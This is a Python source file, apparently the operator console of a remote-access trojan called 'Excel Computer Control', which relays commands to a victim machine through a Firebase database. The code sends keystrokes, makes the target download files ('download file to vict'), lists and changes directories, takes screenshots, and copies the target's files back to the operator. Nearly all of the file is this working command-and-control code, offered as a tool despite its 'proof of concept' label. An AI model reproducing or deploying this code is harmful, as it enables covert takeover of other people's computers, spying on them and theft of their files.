import urllib.request, requests, json, time, sys
def haxor(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)
print("""
+--------------------------------------------+
|                                            |
|                                            |
|   EXCEL COMPUTER CONTROL                   |
|                                            |
|   By Ed. E                                 |
|                                            |
|   PROOF OF CONCEPT ONLY                    |
|                                            |
+--------------------------------------------+
""")
validationData = {}
firebaseUrl = ""

while True: # Enter loop
    try:
        haxor("Enter Firebase project ID:")
        firebaseUrl = "https://" + input(" ") + ".firebaseio.com/"

        haxor("Validating database...")
        with urllib.request.urlopen(firebaseUrl + "action.json") as url:
            haxor(" SUCCESS\n")
            data = json.loads(url.read().decode())
            validationData = data
        break
    except:
        haxor(" FAILED\n")

while True:    
    haxor("---------------------------------\n")

    haxor("""

MAIN MENU:

type - Control keyboard
fb - File and Payload Browser (main)

Select an item: """)
    menuS = input("")

# TYPING
    if menuS == "type":
        lastType = ""
        haxor("Typing mode. System updates every 5 seconds on target side. Enter text then press enter. Type help for more info.\n")
        while True:
            toType = input("> ")
            if toType == "exit": break
            elif toType == "help": print("""
Typing help:
TYPE exit to leave.

The plus sign (+), caret (^), percent sign (%), tilde (~), and parentheses ( ) have special meanings to SendKeys. To specify one of these characters, enclose it within braces . For example, to specify the plus sign, use {+}.

Brackets ([ ]) have no special meaning to SendKeys, but you must enclose them in braces.

To specify characters that aren't displayed when you press a key, such as ENTER or TAB, and keys that represent actions rather than characters, use the codes in the following table:

BACKSPACE	{BACKSPACE}, {BS}, or {BKSP}
BREAK	{BREAK}
CAPS LOCK	{CAPSLOCK}
DEL or DELETE	{DELETE} or {DEL}
DOWN ARROW	{DOWN}
END	{END}
ENTER	{ENTER} or ~
ESC	{ESC}
HELP	{HELP}
HOME	{HOME}
INS or INSERT	{INSERT} or {INS}
LEFT ARROW	{LEFT}
NUM LOCK	{NUMLOCK}
PAGE DOWN	{PGDN}
PAGE UP	{PGUP}
PRINT SCREEN	{PRTSC}
RIGHT ARROW	{RIGHT}
SCROLL LOCK	{SCROLLLOCK}
TAB	{TAB}
UP ARROW	{UP}
F1	{F1}
F2	{F2}
F3	{F3}
F4	{F4}
F5	{F5}
F6	{F6}
F7	{F7}
F8	{F8}
F9	{F9}
F10	{F10}
F11	{F11}
F12	{F12}
F13	{F13}
F14	{F14}
F15	{F15}
F16	{F16}

To specify keys combined with any combination of the SHIFT, CTRL, and ALT keys, precede the key code with one or more of the following codes:

SHIFT	+
CTRL	^
ALT	%

            """)
            elif toType == lastType: print("You cannot type the same text twice.")
            else:
                requests.put(firebaseUrl + "action.json", data=json.dumps({"actionType": "keyboard", "actionContent": toType}))
            lastType = toType
            
    if menuS == "fb":
        print("File and Payload Manager. cd to change directory. LS to list. up to go back a directory, clone to copy a file from target to here, screenshot to take a screenshot")
        currentDirectory = "SET DIRECTORY"
        while True:
            toType = input(currentDirectory + "> ")
            if toType == "exit": break
            elif toType == "download": #payload: download file to vict
                requests.put(firebaseUrl + "action.json", data=json.dumps({"actionType": "download", "actionContent": input("Enter a URL: ")+ ","+input("Enter a filename: ")}))
                haxor("Waiting........")
                time.sleep(5)
                _ = json.loads(requests.get(firebaseUrl + "response.json").text)
                haxor(_["responseText"] + "\n")
                if "Downloading." in _["responseText"]:
                    # We all good
                    while True:
                        haxor(".....")
                        time.sleep(5)
                        _ = json.loads(requests.get(firebaseUrl + "response.json").text)
                        if not "Downloading." in _["responseText"]:
                            haxor("Download complete.")
                            break
            elif toType == "sound": # payload: play audio
                requests.put(firebaseUrl + "action.json", data=json.dumps({"actionType": "playsound", "actionContent": input("Enter FULL path to a WAV file to play: ")}))
            elif toType == "ls":
                haxor("Submitting... \n")
                requests.put(firebaseUrl + "action.json", data=json.dumps({"actionType": "ls", "actionContent": ""}))
                haxor("Waiting........ \n")
                time.sleep(5)
                _ = json.loads(requests.get(firebaseUrl + "response.json").text)
                haxor(_["responseText"] + "\n")
                _f = json.loads(_["content"]) # File list
                haxor("Found "+ str(len(_f)) + " files and folders \n \n")
                for fl in _f:
                    print(currentDirectory + fl)
            elif toType == "cd":
                haxor("Submitting... \n")
                requests.put(firebaseUrl + "action.json", data=json.dumps({"actionType": "cd", "actionContent": input("Enter FULL path: ")}))
                haxor("Waiting................... \n")
                time.sleep(5)
                _ = json.loads(requests.get(firebaseUrl + "response.json").text)
                haxor(_["responseText"] + "\n")
                currentDirectory = _["content"]
            elif toType == "screenshot":
                haxor("Requesting screenshot...")
                requests.put(firebaseUrl + "action.json", data=json.dumps({"actionType": "screenshot", "actionContent": input("Enter a name for this screenshot: ")}))
                time.sleep(7)
                _ = json.loads(requests.get(firebaseUrl + "response.json").text)
                haxor(_["responseText"] + "\n")
                currentDirectory = _["content"]
            elif toType == "clone":
                requests.put(firebaseUrl + "action.json", data=json.dumps({"actionType": "retrieve", "actionContent": input("Enter FULL path: ")}))
                haxor("Uploading...")
                time.sleep(5)
                _ = json.loads(requests.get(firebaseUrl + "response.json").text)
                haxor(_["responseText"] + "\n")
                if "Uploading." in _["responseText"]:
                    # We all good
                    while True:
                        haxor(".....")
                        time.sleep(5)
                        _ = json.loads(requests.get(firebaseUrl + "response.json").text)
                        if not "Uploading." in _["responseText"]:
                            haxor("Upload complete.")
                            break
                    
                    #Download itt
                    haxor("Downloading....\n")
                    saveAs = input("Enter a filename: ")
                    url = _["content"]
                    r = requests.get(url)
                    with open(saveAs, 'wb') as f:
                        f.write(r.content)
                    




